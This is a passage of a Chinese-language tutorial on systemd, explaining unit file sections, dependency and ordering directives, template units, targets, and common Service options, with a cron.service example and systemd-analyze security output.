\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u662f\u200b\u4e00\u4e2a\u200b INI \u200b\u683c\u5f0f\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u901a\u5e38\u200b\u5305\u62ec\u200b\u4e00\u4e2a\u200b <code>[Unit]</code> section\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b unit \u200b\u7684\u200b\u7c7b\u578b\u200b\u4e0d\u540c\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b section\u3002\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4f1a\u200b\u6709\u200b <code>[Service]</code> section\uff0c\u200b\u5e76\u200b\u901a\u5e38\u200b\u4f1a\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b <code>[Install]</code> section\u3002\u200b\u4ee5\u200b cron \u200b\u670d\u52a1\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e3a\u4f8b\u200b\uff1a</p> /lib/systemd/system/cron.service<pre><code>[Unit]\nDescription=Regular background program processing daemon\nDocumentation=man:cron(8)\nAfter=remote-fs.target nss-user-lookup.target\n\n[Service]\nEnvironmentFile=-/etc/default/cron\nExecStart=/usr/sbin/cron -f -P $EXTRA_OPTS\nIgnoreSIGPIPE=false\nKillMode=process\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>\u200b\u67e5\u8be2\u200b\u624b\u518c\u200b</p> <p>Unit \u200b\u914d\u7f6e\u200b\u4e2d\u200b\u4e0d\u540c\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u5206\u5e03\u200b\u5728\u200b systemd \u200b\u4e0d\u540c\u200b\u7684\u200b\u624b\u518c\u200b\u9875\u200b\u4e2d\u200b\u3002\u200b\u5176\u4e2d\u200b <code>[Unit]</code> \u200b\u548c\u200b <code>[Install]</code> \u200b\u90e8\u5206\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>systemd.unit(5)</code> \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u670d\u52a1\u200b\uff0c<code>[Service]</code> \u200b\u4e2d\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u5927\u90e8\u5206\u200b\u5728\u200b <code>systemd.service(5)</code> \u200b\u4e2d\u200b\uff0c\u200b\u4f46\u200b\u5176\u4e2d\u200b\u4e0e\u200b\u8fd0\u884c\u200b\u73af\u5883\u200b\u6709\u5173\u200b\u7684\u200b\u4f1a\u200b\u5728\u200b <code>systemd.exec(5)</code> \u200b\u4e2d\u200b\uff0c\u200b\u4e0e\u200b\u7a0b\u5e8f\u200b\u8d44\u6e90\u200b\u9650\u5236\u200b\u76f8\u5173\u200b\u7684\u200b\u4f1a\u200b\u5728\u200b <code>systemd.resource-control(5)</code> \u200b\u4e2d\u200b\uff0c\u200b\u4e0e\u200b\u9000\u51fa\u200b/\u200b\u6740\u6b7b\u200b\u670d\u52a1\u200b\u76f8\u5173\u200b\u7684\u200b\u4f1a\u200b\u5728\u200b <code>systemd.kill(5)</code> \u200b\u4e2d\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u5b9a\u65f6\u5668\u200b\uff0c<code>[Timer]</code> \u200b\u90e8\u5206\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>systemd.timer(5)</code> \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p>"},{"location":"ops/service/#unit-dependency","title":"\u987a\u5e8f\u200b\u4e0e\u200b\u4f9d\u8d56","text":"<p>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b SysVinit\uff08\u200b\u5b8c\u5168\u200b\u987a\u5e8f\u200b\u542f\u52a8\u200b\uff09\u200b\u548c\u200b upstart\uff08\u200b\u57fa\u4e8e\u200b event \u200b\u89e6\u53d1\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6709\u9650\u200b\u7684\u200b\u5e76\u884c\u200b\uff09\uff0csystemd \u200b\u7684\u200b\u6bcf\u4e2a\u200b unit \u200b\u90fd\u200b\u660e\u786e\u200b\u6307\u5b9a\u200b\u4e86\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5206\u6790\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\u540e\u200b systemd \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6700\u5927\u5316\u200b\u5e76\u884c\u200b\u542f\u52a8\u200b\u670d\u52a1\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u5927\u5927\u7f29\u77ed\u200b\u542f\u52a8\u200b\u65f6\u95f4\u200b\u3002</p> <p>Systemd \u200b\u4e2d\u200b\u7684\u200b unit \u200b\u6709\u200b\u5f88\u591a\u200b\u72b6\u6001\u200b\uff0c\u200b\u5927\u81f4\u200b\u53ef\u4ee5\u200b\u5f52\u4e3a\u200b\u4ee5\u4e0b\u200b\u51e0\u7c7b\u200b\uff1a</p> <ul> <li>inactive\uff1a\u200b\u672a\u200b\u542f\u52a8\u200b</li> <li>activating\uff1a\u200b\u6b63\u5728\u200b\u542f\u52a8\u200b</li> <li>active\uff1a\u200b\u5df2\u200b\u542f\u52a8\u200b\uff08\u200b\u6210\u529f\u200b\uff09</li> <li>deactivating\uff1a\u200b\u6b63\u5728\u200b\u505c\u6b62\u200b</li> <li>failed\uff1a\u200b\u542f\u52a8\u200b\u5931\u8d25\u200b</li> </ul> <p>\u200b\u5927\u90e8\u5206\u200b\u7cfb\u7edf\u200b unit \u200b\u90fd\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <code>Wants=</code> \u200b\u548c\u200b <code>Requires=</code> <p>\u200b\u6307\u5b9a\u200b unit \u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7f51\u7edc\u670d\u52a1\u200b\u901a\u5e38\u200b\u4f1a\u200b\u4f9d\u8d56\u200b <code>network.target</code>\uff0c\u200b\u5373\u5f53\u200b\u7f51\u7edc\u200b\u5f00\u59cb\u200b\u914d\u7f6e\u200b\u65f6\u624d\u200b\u4f1a\u200b\u8fd0\u884c\u200b\u3002 \u200b\u4e24\u8005\u200b\u90fd\u200b\u5728\u200b <code>[Unit]</code> section \u200b\u4e2d\u200b\u6307\u5b9a\u200b\uff0c\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b <code>Requires=</code> \u200b\u662f\u200b\u5f3a\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u5373\u200b\u5982\u679c\u200b\u88ab\u200b\u4f9d\u8d56\u200b\u7684\u200b unit \u200b\u6ca1\u6709\u200b\u542f\u52a8\u200b\u6216\u200b\u542f\u52a8\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f53\u524d\u200b unit \u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u5931\u8d25\u200b\uff0c\u200b\u540c\u65f6\u200b\u5982\u679c\u200b\u88ab\u200b\u4f9d\u8d56\u200b\u7684\u200b unit \u200b\u505c\u6b62\u200b\uff0c\u200b\u5219\u200b\u5f53\u524d\u200b unit \u200b\u4e5f\u200b\u4f1a\u200b\u505c\u6b62\u200b\uff1b \u200b\u800c\u200b <code>Wants=</code> \u200b\u662f\u200b\u5f31\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u5373\u200b\u5c1d\u8bd5\u200b\u542f\u52a8\u200b\u88ab\u200b\u4f9d\u8d56\u200b\u7684\u200b unit\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b\u5931\u8d25\u200b\u4e86\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u5f53\u524d\u200b unit \u200b\u7684\u200b\u542f\u52a8\u200b\u3002</p> <code>WantedBy=</code> \u200b\u548c\u200b <code>RequiredBy=</code> <p>\u200b\u4e0e\u200b\u4e0a\u9762\u200b\u4e24\u4e2a\u200b\u76f8\u53cd\u200b\uff0c\u200b\u6307\u5b9a\u200b\u4e86\u200b\u5176\u4ed6\u200b unit \u200b\u4f9d\u8d56\u200b\u5f53\u524d\u200b unit\u3002 \u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5b57\u6bb5\u200b\u5728\u200b <code>[Install]</code> section \u200b\u4e2d\u200b\u6307\u5b9a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4ec5\u5f53\u200b\u5bf9\u5e94\u200b\u7684\u200b unit \u200b\u88ab\u200b\u542f\u7528\u200b\uff08<code>systemctl enable</code>\uff09\u200b\u65f6\u624d\u200b\u4f1a\u200b\u751f\u6548\u200b\u3002</p> <code>Before=</code> \u200b\u548c\u200b <code>After=</code> <p>\u200b\u6307\u5b9a\u200b\u542f\u52a8\u200b\u987a\u5e8f\u200b\uff0c\u200b\u5373\u200b\u76f8\u5173\u200b\u7684\u200b unit \u200b\u9700\u8981\u200b\u5728\u200b\u524d\u8005\u200b\u542f\u52a8\u200b\u5b8c\u6210\u200b\uff0c\u200b\u8fdb\u5165\u200b active \u200b\u72b6\u6001\u200b\u540e\u200b\u624d\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u542f\u52a8\u200b\u3002\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5b57\u6bb5\u200b\u5728\u200b <code>[Unit]</code> section \u200b\u4e2d\u200b\u6307\u5b9a\u200b\u3002 \u200b\u4e0e\u200b Wants/Requires \u200b\u4e0d\u540c\u200b\uff0cBefore/After \u200b\u53ea\u662f\u200b\u6307\u5b9a\u200b\u542f\u52a8\u200b\u987a\u5e8f\u200b\uff0c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\u548c\u200b\u542f\u52a8\u200b\u987a\u5e8f\u200b\u662f\u200b\u4e92\u76f8\u200b\u72ec\u7acb\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u53ea\u200b\u5199\u200b <code>Requires=</code> \u200b\u6216\u200b <code>Wants=</code>\uff0c\u200b\u6ca1\u6709\u200b\u5199\u200b <code>Before=</code> \u200b\u6216\u200b <code>After=</code>\uff0c\u200b\u90a3\u4e48\u200b systemd \u200b\u4f1a\u200b\u542f\u52a8\u200b\u4f9d\u8d56\u200b\u4e0e\u200b\u88ab\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5355\u5143\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u4fdd\u8bc1\u200b\u5b83\u4eec\u200b\u7684\u200b\u542f\u52a8\u200b\u987a\u5e8f\u200b\u3002</p>"},{"location":"ops/service/#unit-template","title":"\u6a21\u677f","text":"<p>Systemd \u200b\u7684\u200b unit \u200b\u652f\u6301\u200b\u6a21\u677f\u200b\u7279\u6027\u200b\uff1a\u200b\u4e00\u4e2a\u200b unit \u200b\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u5b9e\u4f8b\u200b\u5316\u4e3a\u200b\u591a\u4e2a\u200b unit\u3002\u200b\u6a21\u677f\u200b unit \u200b\u7684\u200b\u6587\u4ef6\u540d\u200b\uff08\u200b\u4e0d\u200b\u542b\u200b\u6269\u5c55\u540d\u200b\uff09\u200b\u7ed3\u5c3e\u200b\u662f\u200b <code>@</code>\uff0c\u200b\u4f8b\u5982\u200b <code>foo@.service</code>\u3002\u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u65f6\u200b\u9700\u8981\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>systemctl enable --now foo@arg.service</code>\u3002</p> <p>\u200b\u5728\u200b unit \u200b\u6587\u4ef6\u200b\u5185\u90e8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>%i</code> \u200b\u548c\u200b <code>%I</code> \u200b\u6765\u200b\u5f15\u7528\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b\uff08\u200b\u5176\u4e2d\u200b <code>%I</code> \u200b\u662f\u200b\u6ca1\u6709\u200b\u7ecf\u8fc7\u200b\u8f6c\u4e49\u200b\u7684\u200b\uff09\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>[Unit]\nDescription=Hello for %I\n\n[Service]\n# ...\nExecStart=/usr/bin/echo Hello, %i\n</code></pre>"},{"location":"ops/service/#target","title":"Target","text":"<p>Target \u200b\u662f\u200b\u4e00\u7ec4\u200b\u670d\u52a1\u200b\uff08\u200b\u5176\u4ed6\u200b unit\uff09\u200b\u7684\u200b\u96c6\u5408\u200b\uff0c\u200b\u901a\u8fc7\u200b target \u200b\u8fd9\u6837\u200b\u4e00\u5c42\u200b\u62bd\u8c61\u200b\u53ef\u4ee5\u200b\u66f4\u200b\u65b9\u4fbf\u200b\u5730\u200b\u7ba1\u7406\u200b\u670d\u52a1\u200b\u7684\u200b\u542f\u52a8\u200b\u987a\u5e8f\u200b\uff0c\u200b\u7c7b\u4f3c\u200b SysVinit \u200b\u4e2d\u200b\u7684\u200b runlevel\uff0c\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u201c\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u76ee\u6807\u200b\u201d\u3002 \u200b\u4f8b\u5982\u200b\u7f51\u7edc\u670d\u52a1\u200b\u5e94\u8be5\u200b <code>Requires=network-online.target</code> \u200b\u5e76\u4e14\u200b <code>After=network-online.target</code>\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u7f51\u7edc\u670d\u52a1\u200b\u5728\u200b\u7f51\u7edc\u200b\u8fde\u901a\u200b\u540e\u200b\u518d\u542f\u52a8\u200b\u3002</p> <p>Systemd \u200b\u5728\u200b\u5f00\u673a\u200b\u65f6\u4f1a\u200b\u5c1d\u8bd5\u200b\u542f\u52a8\u200b default.target\uff0c\u200b\u8fd9\u4e2a\u200b target \u200b\u4e00\u822c\u200b\u662f\u200b\u6307\u5411\u200b graphical.target \u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u5373\u200b\u542f\u52a8\u200b\u56fe\u5f62\u754c\u9762\u200b\u76f8\u5173\u200b\u7684\u200b\u670d\u52a1\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b multi-user.target \u200b\u5219\u200b\u662f\u200b\u547d\u4ee4\u884c\u200b\u6a21\u5f0f\u200b\u3002</p> systemd target SysVinit runlevel \u200b\u8bf4\u660e\u200b poweroff.target 0 \u200b\u5173\u673a\u200b rescue.target 1 \u200b\u5355\u7528\u6237\u200b\u6a21\u5f0f\u200b \uff08\u200b\u65e0\u200b\uff09 2 \uff08systemd \u200b\u4e0d\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b runlevel\uff09 multi-user.target 3 \u200b\u591a\u7528\u6237\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u4f46\u200b\u53ea\u6709\u200b\u547d\u4ee4\u884c\u200b \uff08\u200b\u65e0\u200b\uff09 4 \uff08systemd \u200b\u4e0d\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b runlevel\uff09 graphical.target 5 \u200b\u56fe\u5f62\u754c\u9762\u200b reboot.target 6 \u200b\u91cd\u542f\u200b emergency.target S \u200b\u7d27\u6025\u200b\u6a21\u5f0f\u200b halt.target \uff08\u200b\u65e0\u200b\uff09 \u200b\u7cfb\u7edf\u200b\u5df2\u7ecf\u200b\u505c\u6b62\u200b\uff0c\u200b\u4f46\u662f\u200b\u65e2\u200b\u4e0d\u65ad\u200b\u7535\u200b\u4e5f\u200b\u4e0d\u200b\u91cd\u542f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5173\u673a\u200b\u65e5\u5fd7\u200b <p>\u200b\u9ed8\u8ba4\u200b\u7684\u200b target \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>systemctl set-default</code> \u200b\u547d\u4ee4\u200b\u4fee\u6539\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b GRUB \u200b\u4e2d\u4e3a\u200b kernel cmdline \u200b\u6307\u5b9a\u200b <code>systemd.unit=</code>\u3002 \u200b\u4e0e\u200b\u5176\u4ed6\u200b <code>systemctl</code> \u200b\u547d\u4ee4\u200b\u4e00\u6837\u200b\uff0c\u200b\u524d\u8005\u200b\u7684\u200b\u672c\u8d28\u200b\u662f\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u8f6f\u200b\u94fe\u63a5\u200b <code>/etc/systemd/system/default.target</code>\u3002</p>"},{"location":"ops/service/#service","title":"Service","text":"<p>Service \u200b\u4e5f\u200b\u5c31\u662f\u200b\u6211\u4eec\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u670d\u52a1\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u6709\u200b\u4e00\u4e2a\u200b <code>[Service]</code> section\uff0c\u200b\u5305\u62ec\u200b\u4e86\u200b\u670d\u52a1\u200b\u7684\u200b\u542f\u52a8\u200b\u547d\u4ee4\u200b\u548c\u200b\u4e00\u7cfb\u5217\u200b\u5176\u4ed6\u200b\u914d\u7f6e\u200b\u3002\u200b\u4ee5\u200b\u4e0a\u9762\u200b\u7684\u200b cron \u200b\u670d\u52a1\u200b\u4e3a\u4f8b\u200b\uff1a</p> <ul> <li><code>[Unit]</code> \u200b\u90e8\u5206\u200b\u6307\u5b9a\u200b\u7684\u200b <code>After=remote-fs.target nss-user-lookup.target</code> \u200b\u8868\u793a\u200b cron \u200b\u4f1a\u200b\u5728\u200b\u7cfb\u7edf\u200b\u8fbe\u5230\u200b\u8fd9\u200b\u4e24\u4e2a\u200b target \u200b\u4e4b\u540e\u200b\u624d\u200b\u542f\u52a8\u200b\uff0c\u200b\u5373\u200b\u8fdc\u7a0b\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6302\u8f7d\u200b\u5b8c\u6210\u200b\u548c\u200b\u7528\u6237\u200b\u4fe1\u606f\u200b\u670d\u52a1\u200b\uff08<code>getent passwd</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\u53ef\u7528\u200b\uff09\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u542f\u52a8\u200b\u3002</li> <li><code>EnvironmentFile=-/etc/default/cron</code> \u200b\u8868\u793a\u200b\u4f1a\u200b\u8bfb\u53d6\u200b <code>/etc/default/cron</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u73af\u5883\u53d8\u91cf\u200b\u3002\u200b\u5f00\u5934\u200b\u7684\u200b <code>-</code> \u200b\u8868\u793a\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u5219\u200b\u76f4\u63a5\u200b\u5ffd\u7565\u200b\u3002</li> <li> <p><code>ExecStart=/usr/sbin/cron -f -P $EXTRA_OPTS</code> \u200b\u6307\u5b9a\u200b\u4e86\u200b\u670d\u52a1\u200b\u7684\u200b\u542f\u52a8\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5176\u4e2d\u200b <code>$EXTRA_OPTS</code> \u200b\u662f\u4ece\u200b\u4e0a\u9762\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u73af\u5883\u53d8\u91cf\u200b\u3002</p> <p>Tip</p> <p>\u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6211\u4eec\u200b\u5efa\u8bae\u200b\u5bf9\u200b\u547d\u4ee4\u200b\u4f7f\u7528\u200b\u7edd\u5bf9\u8def\u5f84\u200b\uff0c\u200b\u56e0\u4e3a\u200b systemd \u200b\u542f\u52a8\u200b\u670d\u52a1\u200b\u65f6\u200b\u5e76\u200b\u4e0d\u4f1a\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u914d\u7f6e\u200b\u7684\u200b <code>$PATH</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\uff0c\u200b\u800c\u662f\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u786c\u200b\u7f16\u7801\u200b\u7684\u200b\u5217\u8868\u200b\u3002</p> </li> <li> <p><code>Restart=on-failure</code> \u200b\u8868\u793a\u200b\u670d\u52a1\u200b\u5728\u200b\u5931\u8d25\u200b\u65f6\u4f1a\u200b\u81ea\u52a8\u200b\u91cd\u542f\u200b\u3002<code>Restart=</code> \u200b\u7684\u200b\u53d6\u503c\u200b\u548c\u200b\u542b\u4e49\u200b\u53ef\u4ee5\u200b\u5728\u200b systemd.service \u200b\u6587\u6863\u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> </li> <li>\u200b\u6700\u540e\u200b\u7684\u200b <code>[Install]</code> \u200b\u90e8\u5206\u200b\u6307\u5b9a\u200b\u4e86\u200b\u670d\u52a1\u200b\u7684\u200b\u542f\u52a8\u200b\u7ea7\u522b\u200b\uff0c\u200b\u5373\u200b <code>WantedBy=multi-user.target</code> \u200b\u8868\u793a\u200b\u5728\u200b\u591a\u7528\u6237\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u542f\u52a8\u200b\u3002</li> </ul> <p>\u200b\u5176\u4ed6\u200b\u5e38\u7528\u200b\u7684\u200b\u914d\u7f6e\u200b\u8fd8\u6709\u200b\uff1a</p> <code>ExecStartPre=</code>\u3001<code>ExecStartPost=</code>\u3001<code>ExecStopPost=</code> <p>\u200b\u5728\u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\u524d\u200b\u3001\u200b\u542f\u52a8\u200b\u540e\u200b\u3001\u200b\u505c\u6b62\u200b\u540e\u200b\u6267\u884c\u200b\u7684\u200b\u547d\u4ee4\u200b\u3002\u200b\u53ef\u200b\u7528\u4e8e\u200b\u68c0\u67e5\u200b\u670d\u52a1\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\u3001\u200b\u521b\u5efa\u200b\u4e34\u65f6\u6587\u4ef6\u200b\u3001\u200b\u6e05\u7406\u200b\u4e34\u65f6\u6587\u4ef6\u200b\u7b49\u200b\u3002\u200b\u4f8b\u5982\u200b ssh.service \u200b\u5c31\u200b\u4f1a\u200b\u4f7f\u7528\u200b <code>ExecStartPre=/usr/sbin/sshd -t</code> \u200b\u6765\u200b\u68c0\u67e5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\u3002</p> <code>ExecReload=</code> <p>\u200b\u6307\u5b9a\u200b\u91cd\u8f7d\u200b\u670d\u52a1\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b <code>ExecReload=/bin/kill -HUP $MAINPID</code>\u3002 \u200b\u914d\u7f6e\u200b\u4e86\u200b <code>ExecReload=</code> \u200b\u4e4b\u540e\u200b\u5373\u53ef\u200b\u4f7f\u7528\u200b <code>systemctl reload [service]</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u5411\u200b\u670d\u52a1\u200b\u7684\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\u53d1\u9001\u200b SIGHUP \u200b\u4fe1\u53f7\u200b\u3002\u200b\u4e00\u4e9b\u200b\u670d\u52a1\u200b\u8fd8\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b reload \u200b\u547d\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b nginx \u200b\u7684\u200b <code>ExecReload=/usr/sbin/nginx -s reload</code>\u3002</p> <code>Type=</code> <p>\u200b\u6307\u5b9a\u200b\u670d\u52a1\u200b\u7684\u200b\u7c7b\u578b\u200b\u3002\u200b\u5927\u90e8\u5206\u200b\u670d\u52a1\u200b\u90fd\u200b\u7531\u200b\u4e00\u4e2a\u200b\u5728\u200b\u540e\u53f0\u200b\u8fd0\u884c\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u7ec4\u6210\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u7701\u7565\u200b Type \u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u503c\u200b <code>simple</code>\uff0c\u200b\u6216\u8005\u200b\u66f4\u200b\u63a8\u8350\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b <code>Type=exec</code>\u3002\u200b\u5176\u4ed6\u200b\u7684\u200b\u670d\u52a1\u7c7b\u578b\u200b\u53c2\u89c1\u200b\u4e0b\u9762\u200b\u7684\u200b Service Type \u200b\u4e00\u8282\u200b\u3002</p> <code>User=</code>\u3001<code>Group=</code> \u200b\u548c\u200b <code>SupplementaryGroups=</code> <p>\u200b\u6307\u5b9a\u200b\u8fd0\u884c\u200b\u670d\u52a1\u200b\u7684\u200b\u7528\u6237\u200b\u548c\u200b\u7ec4\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u989d\u5916\u200b\u7684\u200b\u9644\u52a0\u200b\u7ec4\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u670d\u52a1\u200b\u4f1a\u4ee5\u200b <code>root</code> \u200b\u7528\u6237\u200b\u8fd0\u884c\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5b89\u5168\u200b\u548c\u200b\u6743\u9650\u200b\u7ba1\u7406\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u5e94\u8be5\u200b\u914d\u7f6e\u200b\u8fd9\u200b\u51e0\u9879\u200b\u8bbe\u7f6e\u200b\u3002</p> <p>Tip</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u5b89\u5168\u200b\u9700\u6c42\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b Sandboxing \u200b\u4e00\u8282\u200b\u4f7f\u7528\u200b systemd \u200b\u63d0\u4f9b\u200b\u7684\u200b\u9ad8\u7ea7\u200b\u9694\u79bb\u200b\u529f\u80fd\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>systemd-analyze security</code> \u200b\u547d\u4ee4\u200b\u68c0\u67e5\u200b\u6574\u4e2a\u200b\u7cfb\u7edf\u200b\u7684\u200b\u670d\u52a1\u200b\u5b89\u5168\u6027\u200b\u914d\u7f6e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e0e\u200b\u5355\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u5177\u4f53\u200b\u914d\u7f6e\u200b\u662f\u5426\u200b\u5b89\u5168\u200b\u3002\u200b\u8be5\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u6839\u636e\u200b\u670d\u52a1\u200b\u914d\u7f6e\u200b\u8ba1\u7b97\u200b \"exposure level\" \u200b\u5206\u6570\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u4f9b\u200b\u76f8\u5173\u200b\u914d\u7f6e\u200b\u4ee5\u53ca\u200b\u89e3\u91ca\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>$ systemd-analyze security --no-pager caddy.service\n  NAME                                         DESCRIPTION                                  EXPOSURE\n\u2717 RemoveIPC=                                   Service user may leave SysV IPC objects aro\u2026      0.1\n\u2717 RootDirectory=/RootImage=                    Service runs within the host's root directo\u2026      0.1\n\u2713 User=/DynamicUser=                           Service runs under a static non-root user i\u2026\n\u2717 CapabilityBoundingSet=~CAP_SYS_TIME          Service processes may change the system clo\u2026      0.2\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre>"},{"location":"ops/service/#service-type","title":"Service Type","text":"simple \u200b\u548c\u200b exec <p>\u200b\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u670d\u52a1\u7c7b\u578b\u200b\uff0c\u200b\u670d\u52a1\u200b\u4e3b\u4f53\u200b\u662f\u200b\u4e00\u4e2a\u200b\u957f\u671f\u200b\u8fd0\u884c\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u3002 \u200b\u4e24\u8005\u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b <code>simple</code> \u200b\u7c7b\u578b\u200b\u201c\u200b\u542f\u52a8\u200b\u5373\u200b\u6210\u529f\u200b\u201d\uff0c\u200b\u5373\u200b <code>systemctl start</code> \u200b\u4f1a\u200b\u7acb\u523b\u200b\u6210\u529f\u200b\u9000\u51fa\u200b\uff1b \u200b\u800c\u200b <code>exec</code> \u200b\u7c7b\u578b\u200b\u4f1a\u200b\u786e\u4fdd\u200b <code>ExecStart=</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\uff0c\u200b\u5305\u62ec\u200b <code>User=</code> \u200b\u548c\u200b <code>Group=</code> 